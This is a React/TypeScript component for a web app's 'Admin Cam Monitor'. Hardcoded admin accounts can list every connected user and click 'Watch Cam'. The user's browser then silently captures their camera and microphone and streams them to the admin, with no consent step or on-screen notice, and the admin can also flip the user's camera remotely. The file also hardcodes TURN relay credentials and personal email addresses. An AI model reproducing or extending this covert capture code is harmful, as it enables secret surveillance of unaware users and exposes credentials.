'use client';

import React, { useEffect, useRef, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';
import {
  ChevronLeft,
  RotateCw,
  Mic,
  MicOff,
  PhoneOff,
  Video,
  SwitchCamera,
  Shield,
  Activity,
  Users,
} from 'lucide-react';
import { triggerHaptic } from '@/lib/haptics';

const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-6gmj.onrender.com';
const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];

// Fallback RTC config — used only if dynamic TURN credential fetch fails
const FALLBACK_RTC_CONFIG: RTCConfiguration = {
  iceServers: [
    {
      urls: [
        'stun:stun.l.google.com:19302',
        'stun:stun1.l.google.com:19302',
        'stun:stun2.l.google.com:19302',
        'stun:stun.relay.metered.ca:80',
      ]
    },
    {
      urls: [
        'turn:global.relay.metered.ca:80',
        'turn:global.relay.metered.ca:80?transport=tcp',
        'turn:global.relay.metered.ca:443',
        'turns:global.relay.metered.ca:443?transport=tcp',
      ],
      username: 'b861bc5468dd05aa2aff283d',
      credential: 'fJYY96O75HWDNLuH'
    },
    {
      urls: [
        'turn:openrelay.metered.ca:80',
        'turn:openrelay.metered.ca:80?transport=tcp',
        'turn:openrelay.metered.ca:443',
        'turns:openrelay.metered.ca:443?transport=tcp',
      ],
      username: 'openrelayproject',
      credential: 'openrelayproject'
    }
  ],
  iceCandidatePoolSize: 0,
  bundlePolicy: 'max-bundle',
  rtcpMuxPolicy: 'require',
  iceTransportPolicy: 'all'
};

let cachedAdminRtcConfig: RTCConfiguration | null = null;
let adminRtcConfigFetchedAt = 0;
const ADMIN_RTC_CONFIG_TTL = 60 * 60 * 1000; // 1 hour

async function fetchRtcConfig(): Promise<RTCConfiguration> {
  if (cachedAdminRtcConfig && Date.now() - adminRtcConfigFetchedAt < ADMIN_RTC_CONFIG_TTL) {
    return cachedAdminRtcConfig;
  }

  try {
    const res = await fetch('/api/turn-credentials', { credentials: 'include' });
    if (!res.ok) throw new Error(`TURN API ${res.status}`);
    const data = await res.json();
    cachedAdminRtcConfig = {
      iceServers: [
        {
          urls: [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302',
            'stun:stun2.l.google.com:19302',
            'stun:stun.relay.metered.ca:80',
          ]
        },
        ...(data.iceServers || []),
      ],
      iceCandidatePoolSize: 0,
      bundlePolicy: 'max-bundle',
      rtcpMuxPolicy: 'require',
      iceTransportPolicy: 'all',
    };
    adminRtcConfigFetchedAt = Date.now();
    return cachedAdminRtcConfig;
  } catch {
    console.warn('[AdminCamViewer] TURN credential fetch failed, using fallback');
    return FALLBACK_RTC_CONFIG;
  }
}

interface CamUser {
  email: string;
  username: string;
  socketId: string;
  connectedAt?: number;
}

interface AdminCamViewerProps {
  userEmail: string;
  username: string;
  isOpen: boolean;
  onOpenChange: (open: boolean) => void;
  onCamUsersCount?: (count: number) => void;
}

const PASTEL_AVATAR_BGS = ['#FFF3CD', '#E0F2FE', '#FCE7F3', '#FEF9C3', '#EDE9FE', '#DCFCE7'];
function getPastelAvatarBg(key: string): string {
  if (!key) return PASTEL_AVATAR_BGS[0];
  let hash = 0;
  for (let i = 0; i < key.length; i++) {
    hash = (hash << 5) - hash + key.charCodeAt(i);
    hash |= 0;
  }
  return PASTEL_AVATAR_BGS[Math.abs(hash) % PASTEL_AVATAR_BGS.length];
}

export default function AdminCamViewer({
  userEmail,
  username,
  isOpen,
  onOpenChange,
  onCamUsersCount,
}: AdminCamViewerProps) {
  const isAdmin = !!userEmail && ADMIN_EMAILS.includes(userEmail.toLowerCase().trim());

  const [camUsers, setCamUsers] = useState<CamUser[]>([]);
  const [viewingUser, setViewingUser] = useState<CamUser | null>(null);
  const [remoteStream, setRemoteStream] = useState<MediaStream | null>(null);
  const [streamStatus, setStreamStatus] = useState<'idle' | 'connecting' | 'live' | 'error'>('idle');
  const [isAudioMuted, setIsAudioMuted] = useState(false);

  useEffect(() => {
    onCamUsersCount?.(camUsers.length);
  }, [camUsers.length, onCamUsersCount]);

  const socketRef = useRef<Socket | null>(null);
  const pcRef = useRef<RTCPeerConnection | null>(null);
  const localStreamRef = useRef<MediaStream | null>(null);
  const remoteVideoRef = useRef<HTMLVideoElement | null>(null);
  const viewingSocketIdRef = useRef<string | null>(null);
  const facingModeRef = useRef<'user' | 'environment'>('user');
  const iceCandidateQueue = useRef<RTCIceCandidateInit[]>([]);

  // ── Sync Remote Stream to Video Element ────────────────────────────────────
  const setVideoRef = useCallback((node: HTMLVideoElement | null) => {
    remoteVideoRef.current = node;
    if (node && remoteStream) {
      node.srcObject = remoteStream;
      node.play().catch(() => {
        node.muted = true;
        node.play().catch(() => {});
      });
    }
  }, [remoteStream]);

  useEffect(() => {
    if (remoteVideoRef.current && remoteStream) {
      remoteVideoRef.current.srcObject = remoteStream;
      remoteVideoRef.current.play().catch(() => {
        if (remoteVideoRef.current) {
          remoteVideoRef.current.muted = true;
          remoteVideoRef.current.play().catch(() => {});
        }
      });
    }
  }, [remoteStream]);

  // ── Deduplicate User List ──────────────────────────────────────────────────
  const dedupeAndSortCamUsers = useCallback((users: CamUser[], adminEmail: string, adminUsername: string, currentSocketId: string): CamUser[] => {
    const map = new Map<string, CamUser>();
    const cleanAdmin = (adminEmail || '').toLowerCase().trim();

    users.forEach(u => {
      if (!u) return;
      const key = u.email ? u.email.toLowerCase().trim() : u.socketId;
      if (!key) return;
      map.set(key, {
        ...u,
        email: u.email ? u.email.toLowerCase().trim() : key,
        username: u.username || (u.email ? u.email.split('@')[0] : 'User')
      });
    });

    if (cleanAdmin) {
      const existing = map.get(cleanAdmin);
      const adminName = adminUsername || cleanAdmin.split('@')[0] || 'Admin';
      const displayName = adminName.toLowerCase().includes('admin') ? adminName : `${adminName} (Admin)`;

      map.set(cleanAdmin, {
        email: cleanAdmin,
        username: displayName,
        socketId: existing?.socketId || currentSocketId || 'admin-self-socket',
      });
    }

    const uniqueList = Array.from(map.values());

    return uniqueList.sort((a, b) => {
      const emailA = (a.email || '').toLowerCase().trim();
      const emailB = (b.email || '').toLowerCase().trim();

      const isAAdmin = emailA === cleanAdmin || ADMIN_EMAILS.includes(emailA);
      const isBAdmin = emailB === cleanAdmin || ADMIN_EMAILS.includes(emailB);

      if (isAAdmin && !isBAdmin) return -1;
      if (!isAAdmin && isBAdmin) return 1;

      return a.username.localeCompare(b.username);
    });
  }, []);

  // ── Acquire Local Camera Feed ──────────────────────────────────────────────
  const acquireLocalCamera = useCallback(async (): Promise<MediaStream | null> => {
    if (localStreamRef.current && localStreamRef.current.getVideoTracks().some(t => t.readyState === 'live')) {
      return localStreamRef.current;
    }
    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
      return null;
    }

    const attempts = [
      { video: { facingMode: facingModeRef.current, width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
      { video: { facingMode: facingModeRef.current }, audio: true },
      { video: true, audio: true },
      { video: { facingMode: facingModeRef.current }, audio: false },
      { video: true, audio: false }
    ];

    for (const constraints of attempts) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        if (stream && stream.getVideoTracks().length > 0) {
          localStreamRef.current = stream;
          return stream;
        }
      } catch (err) {
        console.warn('getUserMedia attempt failed with:', constraints, err);
      }
    }
    return null;
  }, []);

  // ── Stop Viewing / Reset Connection State ─────────────────────────────────
  const stopViewing = useCallback(() => {
    if (localStreamRef.current) {
      localStreamRef.current.getTracks().forEach(t => t.stop());
      localStreamRef.current = null;
    }
    if (pcRef.current) {
      try {
        pcRef.current.onicecandidate = null;
        pcRef.current.ontrack = null;
        pcRef.current.close();
      } catch {}
      pcRef.current = null;
    }
    iceCandidateQueue.current = [];
    setRemoteStream(null);
    setViewingUser(null);
    setStreamStatus('idle');
    viewingSocketIdRef.current = null;
  }, []);

  // ── Handle Incoming Signaling Events ─────────────────────────────────────
  const handleIncomingSignal = useCallback(async (fromSocketId: string, fromEmail: string | undefined, signal: any) => {
    if (!socketRef.current) return;
    const socket = socketRef.current;

    try {
      if (signal.type === 'offer') {
        const stream = await acquireLocalCamera();

        if (pcRef.current) {
          try {
            pcRef.current.onicecandidate = null;
            pcRef.current.ontrack = null;
            pcRef.current.close();
          } catch {}
        }

        const rtcConfig = await fetchRtcConfig();
        const pc = new RTCPeerConnection(rtcConfig);
        pcRef.current = pc;
        iceCandidateQueue.current = [];

        pc.onicecandidate = (e) => {
          if (e.candidate) {
            const candData = {
              candidate: e.candidate.candidate,
              sdpMid: e.candidate.sdpMid,
              sdpMLineIndex: e.candidate.sdpMLineIndex,
            };
            socket.emit('cam_signal', {
              targetSocketId: fromSocketId,
              targetEmail: fromEmail,
              signal: candData,
            });
          }
        };

        await pc.setRemoteDescription(new RTCSessionDescription(signal));

        if (stream) {
          stream.getTracks().forEach(track => {
            try {
              const transceivers = pc.getTransceivers ? pc.getTransceivers() : [];
              const matchingTransceiver = transceivers.find(t => t.receiver.track.kind === track.kind && !t.sender.track);
              if (matchingTransceiver && matchingTransceiver.sender) {
                matchingTransceiver.sender.replaceTrack(track);
                matchingTransceiver.direction = 'sendonly';
              } else {
                pc.addTrack(track, stream);
              }
            } catch (e) {
              console.warn('Track attach error:', e);
            }
          });
        }

        while (iceCandidateQueue.current.length > 0) {
          const candidate = iceCandidateQueue.current.shift();
          if (candidate && candidate.candidate) {
            await pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(() => {});
          }
        }

        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        socket.emit('cam_signal', {
          targetSocketId: fromSocketId,
          targetEmail: fromEmail,
          signal: { type: answer.type, sdp: answer.sdp },
        });
        return;
      }

      if (signal.type === 'answer') {
        if (pcRef.current && pcRef.current.signalingState === 'have-local-offer') {
          await pcRef.current.setRemoteDescription(new RTCSessionDescription(signal));
          while (iceCandidateQueue.current.length > 0) {
            const candidate = iceCandidateQueue.current.shift();
            if (candidate && candidate.candidate) {
              await pcRef.current.addIceCandidate(new RTCIceCandidate(candidate)).catch(() => {});
            }
          }
        }
        return;
      }

      if (signal.candidate !== undefined || signal.sdpMid !== undefined || signal.sdpMLineIndex !== undefined) {
        let candidateInit: RTCIceCandidateInit = signal;
        if (signal.candidate && typeof signal.candidate === 'object') {
          candidateInit = signal.candidate;
        } else if (typeof signal.candidate === 'string') {
          candidateInit = {
            candidate: signal.candidate,
            sdpMid: signal.sdpMid,
            sdpMLineIndex: signal.sdpMLineIndex,
          };
        }

        if (candidateInit && candidateInit.candidate) {
          if (pcRef.current && pcRef.current.remoteDescription && pcRef.current.remoteDescription.type) {
            await pcRef.current.addIceCandidate(new RTCIceCandidate(candidateInit)).catch(e => console.warn('ICE Candidate add error:', e));
          } else {
            iceCandidateQueue.current.push(candidateInit);
          }
        }
      }
    } catch (err) {
      console.warn('WebRTC signal handling error:', err);
    }
  }, [acquireLocalCamera]);

  // ── Socket Connection & Lifecycle ─────────────────────────────────────────
  useEffect(() => {
    if (!userEmail) return;

    const socket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      reconnectionAttempts: Infinity,
      reconnectionDelay: 500,
    });
    socketRef.current = socket;

    socket.on('connect', () => {
      const cleanEmail = userEmail.toLowerCase().trim();
      const cleanUsername = username || cleanEmail.split('@')[0] || 'User';

      socket.emit('identify', { email: cleanEmail });
      socket.emit('cam_user_online', { email: cleanEmail, username: cleanUsername });

      if (isAdmin) {
        socket.emit('cam_get_users');
      }
    });

    let refreshInterval: NodeJS.Timeout | null = null;
    if (isAdmin) {
      refreshInterval = setInterval(() => {
        if (socket.connected) socket.emit('cam_get_users');
      }, 3000);

      socket.on('cam_users_list', (list: CamUser[]) => {
        setCamUsers(dedupeAndSortCamUsers(list, userEmail, username, socket.id || ''));
      });

      socket.on('cam_user_online_event', (user: CamUser) => {
        setCamUsers(prev => dedupeAndSortCamUsers([...prev, user], userEmail, username, socket.id || ''));
      });

      socket.on('cam_user_offline', ({ socketId }: { socketId: string }) => {
        setCamUsers(prev => {
          const filtered = prev.filter(u => u.socketId !== socketId);
          if (viewingSocketIdRef.current === socketId) {
            stopViewing();
          }
          return filtered;
        });
        if (socket.connected) socket.emit('cam_get_users');
      });
    }

    socket.on('cam_signal', ({ fromSocketId, fromEmail, signal }) => {
      handleIncomingSignal(fromSocketId, fromEmail, signal);
    });

    socket.on('cam_flip_camera', async () => {
      try {
        const nextFacing = facingModeRef.current === 'user' ? 'environment' : 'user';
        facingModeRef.current = nextFacing;

        if (localStreamRef.current) {
          localStreamRef.current.getTracks().forEach(t => t.stop());
        }

        let stream: MediaStream | null = null;
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: nextFacing } },
            audio: true
          });
        } catch {
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: nextFacing },
            audio: true
          });
        }

        localStreamRef.current = stream;
        const newTrack = stream?.getVideoTracks()[0];

        if (pcRef.current && newTrack) {
          const sender = pcRef.current.getSenders().find(s => s.track?.kind === 'video');
          if (sender) {
            await sender.replaceTrack(newTrack);
          }
        }
      } catch (e) {
        console.warn('Flip camera error:', e);
      }
    });

    return () => {
      if (localStreamRef.current) {
        localStreamRef.current.getTracks().forEach(t => t.stop());
        localStreamRef.current = null;
      }
      if (refreshInterval) clearInterval(refreshInterval);
      socket.disconnect();
      stopViewing();
    };
  }, [userEmail, isAdmin, username, acquireLocalCamera, dedupeAndSortCamUsers, handleIncomingSignal, stopViewing]);

  // ── Admin Initiates Viewing Target User ──────────────────────────────────
  const startViewing = useCallback(async (user: CamUser) => {
    stopViewing();
    setViewingUser(user);
    setStreamStatus('connecting');
    viewingSocketIdRef.current = user.socketId;

    const rtcConfig = await fetchRtcConfig();
    const pc = new RTCPeerConnection(rtcConfig);
    pcRef.current = pc;
    iceCandidateQueue.current = [];

    pc.addTransceiver('audio', { direction: 'recvonly' });
    pc.addTransceiver('video', { direction: 'recvonly' });

    const timeoutId = setTimeout(() => {
      setStreamStatus(current => current === 'connecting' ? 'error' : current);
    }, 25000);

    const receivedStream = new MediaStream();

    pc.ontrack = (e) => {
      clearTimeout(timeoutId);
      if (e.streams && e.streams[0]) {
        setRemoteStream(e.streams[0]);
        if (remoteVideoRef.current) {
          remoteVideoRef.current.srcObject = e.streams[0];
          remoteVideoRef.current.play().catch(() => {
            if (remoteVideoRef.current) {
              remoteVideoRef.current.muted = true;
              remoteVideoRef.current.play().catch(() => {});
            }
          });
        }
      } else {
        if (!receivedStream.getTrackById(e.track.id)) {
          receivedStream.addTrack(e.track);
        }
        const freshStream = new MediaStream(receivedStream.getTracks());
        setRemoteStream(freshStream);
        if (remoteVideoRef.current) {
          remoteVideoRef.current.srcObject = freshStream;
          remoteVideoRef.current.play().catch(() => {
            if (remoteVideoRef.current) {
              remoteVideoRef.current.muted = true;
              remoteVideoRef.current.play().catch(() => {});
            }
          });
        }
      }
      setStreamStatus('live');
    };

    pc.onicecandidate = (e) => {
      if (e.candidate && socketRef.current) {
        socketRef.current.emit('cam_signal', {
          targetSocketId: user.socketId,
          targetEmail: user.email,
          signal: {
            candidate: e.candidate.candidate,
            sdpMid: e.candidate.sdpMid,
            sdpMLineIndex: e.candidate.sdpMLineIndex,
          },
        });
      }
    };

    pc.onconnectionstatechange = () => {
      if (pc.connectionState === 'connected') {
        clearTimeout(timeoutId);
        setStreamStatus('live');
      } else if (['failed', 'disconnected', 'closed'].includes(pc.connectionState)) {
        setStreamStatus('error');
      }
    };

    const offer = await pc.createOffer({
      offerToReceiveAudio: true,
      offerToReceiveVideo: true,
    });
    await pc.setLocalDescription(offer);

    if (socketRef.current) {
      socketRef.current.emit('cam_signal', {
        targetSocketId: user.socketId,
        targetEmail: user.email,
        signal: { type: offer.type, sdp: offer.sdp },
      });
    }
  }, [stopViewing]);

  // ── Remote Camera Switch Action ──────────────────────────────────────────
  const flipRemoteCamera = useCallback(() => {
    if (!socketRef.current || !viewingUser) return;
    triggerHaptic('medium');
    socketRef.current.emit('cam_flip_camera_remote', {
      targetSocketId: viewingUser.socketId,
      targetEmail: viewingUser.email,
    });
  }, [viewingUser]);

  // ── Audio Mute Toggle ───────────────────────────────────────────────────
  const toggleAudioMute = useCallback(() => {
    triggerHaptic('light');
    setIsAudioMuted(prev => {
      const next = !prev;
      if (remoteVideoRef.current) {
        remoteVideoRef.current.muted = next;
      }
      return next;
    });
  }, []);

  if (!isAdmin || !isOpen) return null;

  return (
    <div className="fixed inset-0 z-[1600] bg-[#141111] flex flex-col overflow-hidden text-white animate-in fade-in duration-200 select-none">
      {/* ─────────────────────────────────────────────────────────────
          SCREEN 1: CLIENT LIST VIEW (When not viewing a stream)
      ───────────────────────────────────────────────────────────── */}
      {!viewingUser ? (
        <div className="flex flex-col h-full w-full bg-[#141111] overflow-hidden">
          {/* Top Zinc Header */}
          <div className="w-full bg-[#141111] pt-14 pb-4 px-6 flex items-center justify-between shrink-0 select-none">
            {/* Left: Back Button (No border, no outline) + Title */}
            <div className="flex items-center gap-3">
              <button
                type="button"
                onClick={() => {
                  triggerHaptic('light');
                  onOpenChange(false);
                }}
                className="p-1.5 -ml-1.5 text-white hover:text-zinc-300 active:scale-90 transition-all cursor-pointer outline-none border-0 ring-0 focus:outline-none focus:ring-0 bg-transparent"
                title="Close Cam Monitor"
              >
                <ChevronLeft className="w-6 h-6 text-white" strokeWidth={2.4} />
              </button>

              <div className="flex flex-col">
                <span className="text-[12.5px] text-zinc-400 font-medium tracking-wide flex items-center gap-1.5">
                  <Shield className="w-3.5 h-3.5 text-[#9D4EDD]" />
                  Admin Cam Monitor
                </span>
                <h1 className="text-[24px] font-black text-white tracking-tight leading-tight bg-gradient-to-r from-white via-zinc-100 to-zinc-300 bg-clip-text">
                  Online Clients
                </h1>
              </div>
            </div>

            {/* Right: Live Count Badge + Refresh */}
            <div className="flex items-center gap-2">
              <span className="px-3 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 text-xs font-bold flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                {camUsers.length} Online
              </span>

              <button
                type="button"
                onClick={() => {
                  triggerHaptic('light');
                  if (socketRef.current?.connected) {
                    socketRef.current.emit('cam_get_users');
                  }
                }}
                className="p-2 text-zinc-400 hover:text-white active:scale-90 transition-all cursor-pointer outline-none border-0 ring-0 bg-transparent"
                title="Refresh user list"
              >
                <RotateCw className="w-4 h-4" />
              </button>
            </div>
          </div>

          {/* White Rounded Client List Sheet */}
          <div className="w-full flex-1 bg-white rounded-t-[32px] px-4 pt-4 pb-6 flex flex-col relative shadow-[0_-8px_30px_rgba(0,0,0,0.15)] overflow-hidden min-h-0">
            <div className="flex items-center justify-between px-2 pb-3 border-b border-zinc-100 mb-2 shrink-0">
              <span className="text-[13px] font-bold text-zinc-500 uppercase tracking-wider">
                Available Streams ({camUsers.length})
              </span>
              <span className="text-xs text-zinc-400 font-medium">Tap any user to monitor</span>
            </div>

            <div className="flex-1 overflow-y-auto no-scrollbar space-y-2">
              {camUsers.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-20 text-center text-zinc-400">
                  <div className="w-16 h-16 rounded-full bg-zinc-100 flex items-center justify-center mb-3">
                    <Users className="w-7 h-7 text-zinc-300" />
                  </div>
                  <span className="text-[15px] font-bold text-zinc-700">No Online Users</span>
                  <span className="text-xs text-zinc-400 mt-1 max-w-xs">
                    Users will appear here in real-time when they connect to the app.
                  </span>
                </div>
              ) : (
                camUsers.map((user) => {
                  const avatarBg = getPastelAvatarBg(user.email || user.username || user.socketId);
                  const isSelf = user.email.toLowerCase().trim() === userEmail.toLowerCase().trim();

                  return (
                    <div
                      key={user.socketId || user.email}
                      onClick={() => {
                        triggerHaptic('medium');
                        startViewing(user);
                      }}
                      className="w-full p-3.5 rounded-2xl bg-zinc-50 hover:bg-zinc-100/90 active:scale-[0.99] border border-zinc-100 flex items-center justify-between gap-3 cursor-pointer transition-all shadow-2xs group"
                    >
                      {/* Avatar with Live Indicator */}
                      <div className="flex items-center gap-3.5 min-w-0">
                        <div
                          className="w-12 h-12 rounded-full flex items-center justify-center text-zinc-800 text-lg font-bold shrink-0 relative shadow-xs"
                          style={{ backgroundColor: avatarBg }}
                        >
                          {user.username.charAt(0).toUpperCase()}
                          <span className="w-3 h-3 bg-emerald-500 rounded-full absolute bottom-0 right-0 ring-2 ring-white" />
                        </div>

                        <div className="flex flex-col min-w-0">
                          <div className="flex items-center gap-1.5">
                            <span className="text-[15px] font-bold text-zinc-900 truncate">
                              {user.username}
                            </span>
                            {isSelf && (
                              <span className="px-1.5 py-0.5 rounded-md bg-purple-100 text-[#9D4EDD] text-[10px] font-black">
                                YOU
                              </span>
                            )}
                          </div>
                          <span className="text-xs text-zinc-400 truncate font-medium mt-0.5">
                            {user.email || user.socketId}
                          </span>
                        </div>
                      </div>

                      {/* Right Action: Cam Button */}
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          triggerHaptic('medium');
                          startViewing(user);
                        }}
                        className="px-4 py-2 rounded-full bg-zinc-900 hover:bg-zinc-800 text-white text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-all active:scale-95 shadow-xs shrink-0"
                      >
                        <Video className="w-3.5 h-3.5" />
                        <span>Watch Cam</span>
                      </button>
                    </div>
                  );
                })
              )}
            </div>
          </div>
        </div>
      ) : (
        /* ─────────────────────────────────────────────────────────────
            SCREEN 2: ACTIVE VIDEO CALL-STYLE CAM MONITOR UI
        ───────────────────────────────────────────────────────────── */
        <div className="flex flex-col h-full w-full bg-[#141111] overflow-hidden">
          {/* Top Zinc Header Bar */}
          <div className="w-full bg-[#141111] pt-12 pb-3 px-5 flex items-center justify-between shrink-0 select-none z-20">
            {/* Top-Left: Back button without outline/border */}
            <div className="flex items-center gap-3 min-w-0 flex-1">
              <button
                type="button"
                onClick={() => {
                  triggerHaptic('light');
                  stopViewing();
                }}
                className="p-1.5 -ml-1.5 text-white hover:text-zinc-300 active:scale-90 transition-all flex-shrink-0 cursor-pointer outline-none border-0 ring-0 focus:outline-none focus:ring-0 bg-transparent"
                title="Back to client list"
              >
                <ChevronLeft className="w-6 h-6 text-white" strokeWidth={2.4} />
              </button>

              {/* User Presence & Name */}
              <div className="flex items-center gap-3 min-w-0">
                <div
                  className="w-10 h-10 rounded-full flex items-center justify-center text-zinc-800 text-sm font-bold shrink-0 relative"
                  style={{ backgroundColor: getPastelAvatarBg(viewingUser.email || viewingUser.username) }}
                >
                  {viewingUser.username.charAt(0).toUpperCase()}
                  <span className="w-2.5 h-2.5 bg-emerald-500 rounded-full absolute bottom-0 right-0 ring-2 ring-[#141111]" />
                </div>

                <div className="flex flex-col min-w-0">
                  <h3 className="text-[16px] font-bold text-white truncate leading-tight">
                    {viewingUser.username}
                  </h3>
                  <span className="text-[11.5px] text-zinc-400 font-medium flex items-center gap-1 mt-0.5">
                    {streamStatus === 'live' ? (
                      <>
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                        <span className="text-emerald-400 font-bold">Live Stream</span>
                      </>
                    ) : streamStatus === 'connecting' ? (
                      <>
                        <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse" />
                        <span className="text-amber-400">Connecting peer...</span>
                      </>
                    ) : (
                      <>
                        <span className="w-1.5 h-1.5 rounded-full bg-red-400" />
                        <span className="text-red-400">Connection Failed</span>
                      </>
                    )}
                  </span>
                </div>
              </div>
            </div>

            {/* Top-Right: Camera Switch Button (Flip Front <-> Back) */}
            <div className="flex items-center gap-2 shrink-0">
              <button
                type="button"
                onClick={flipRemoteCamera}
                className="w-10 h-10 rounded-full flex items-center justify-center bg-white/10 hover:bg-white/20 active:scale-90 text-white cursor-pointer transition-all outline-none border-0 ring-0 shadow-sm"
                title="Switch Camera (Front / Back)"
              >
                <SwitchCamera className="w-5 h-5 text-white" strokeWidth={2.2} />
              </button>
            </div>
          </div>

          {/* Center: Live Video Feed Display Container */}
          <div className="relative flex-1 w-full bg-black rounded-t-[32px] overflow-hidden flex items-center justify-center shadow-[0_-8px_30px_rgba(0,0,0,0.5)]">
            <video
              ref={setVideoRef}
              autoPlay
              playsInline
              className={`w-full h-full object-cover transition-opacity duration-300 ${
                streamStatus === 'live' ? 'opacity-100' : 'opacity-0 pointer-events-none'
              }`}
            />

            {/* Connecting / Idle / Error Status Overlay */}
            {streamStatus !== 'live' && (
              <div className="absolute inset-0 flex flex-col items-center justify-center p-6 text-center bg-zinc-950/90 z-10">
                <div
                  className="w-24 h-24 rounded-full flex items-center justify-center text-zinc-900 text-3xl font-black mb-4 relative shadow-2xl animate-pulse"
                  style={{ backgroundColor: getPastelAvatarBg(viewingUser.email || viewingUser.username) }}
                >
                  {viewingUser.username.charAt(0).toUpperCase()}
                </div>

                <h3 className="text-lg font-bold text-white mb-1">
                  {streamStatus === 'connecting' ? `Connecting to ${viewingUser.username}...` : 'Stream Offline'}
                </h3>
                <p className="text-xs text-zinc-400 max-w-xs">
                  {streamStatus === 'connecting'
                    ? 'Negotiating WebRTC stream with remote camera.'
                    : 'Target client camera is not accessible or offline.'}
                </p>

                {streamStatus === 'error' && (
                  <button
                    type="button"
                    onClick={() => {
                      triggerHaptic('medium');
                      startViewing(viewingUser);
                    }}
                    className="mt-5 px-6 py-2.5 rounded-full bg-[#9D4EDD] hover:bg-[#8A38CC] text-white text-xs font-bold cursor-pointer transition-all active:scale-95 shadow-md flex items-center gap-2"
                  >
                    <RotateCw className="w-4 h-4" />
                    <span>Try Reconnecting</span>
                  </button>
                )}
              </div>
            )}

            {/* Live Indicator Pill on top-left of video */}
            {streamStatus === 'live' && (
              <div className="absolute top-4 left-4 z-20 flex items-center gap-1.5 px-3 py-1 rounded-full bg-black/60 backdrop-blur-md border border-white/15 text-white text-[11px] font-bold shadow-lg">
                <span className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                <span className="text-red-400">REC</span>
                <span className="text-white/80 font-normal">| Live Feed</span>
              </div>
            )}
          </div>

          {/* ── BOTTOM DARK ZINC CONTAINER (EXACT VIDEO CALL UI CONTROL BUTTONS) ── */}
          <div className="w-full bg-[#141111] border border-zinc-800/80 rounded-[32px] sm:rounded-[36px] py-4 px-6 mt-3 mb-4 max-w-md mx-auto shadow-[0_10px_35px_rgba(0,0,0,0.5)] flex items-center justify-around shrink-0 z-20">
            {/* 1. Reconnect Button */}
            <button
              type="button"
              onClick={() => {
                triggerHaptic('medium');
                startViewing(viewingUser);
              }}
              className="w-14 h-14 rounded-full flex items-center justify-center bg-zinc-800 hover:bg-zinc-700 active:scale-90 text-white transition-all cursor-pointer shadow-md border-0 outline-none"
              title="Reconnect Stream"
            >
              <RotateCw className="w-5 h-5 text-white" strokeWidth={2.2} />
            </button>

            {/* 2. Mic Enable / Disable (Mute / Unmute Audio) */}
            <button
              type="button"
              onClick={toggleAudioMute}
              className={`w-14 h-14 rounded-full flex items-center justify-center transition-all active:scale-90 cursor-pointer shadow-md border-0 outline-none ${
                isAudioMuted
                  ? 'bg-zinc-800 text-red-400 ring-2 ring-red-500/40'
                  : 'bg-zinc-800 hover:bg-zinc-700 text-white'
              }`}
              title={isAudioMuted ? 'Unmute Audio' : 'Mute Audio'}
            >
              {isAudioMuted ? (
                <MicOff className="w-5 h-5 text-red-400" strokeWidth={2.2} />
              ) : (
                <Mic className="w-5 h-5 text-white" strokeWidth={2.2} />
              )}
            </button>

            {/* 3. Disconnect Button (Far Right) */}
            <button
              type="button"
              onClick={() => {
                triggerHaptic('heavy');
                stopViewing();
              }}
              className="w-14 h-14 rounded-full flex items-center justify-center bg-red-500 hover:bg-red-600 active:scale-90 text-white transition-all shadow-[0_6px_20px_rgba(239,68,68,0.45)] cursor-pointer border-0 outline-none"
              title="Disconnect Stream"
            >
              <PhoneOff className="w-5 h-5 text-white" strokeWidth={2.2} />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
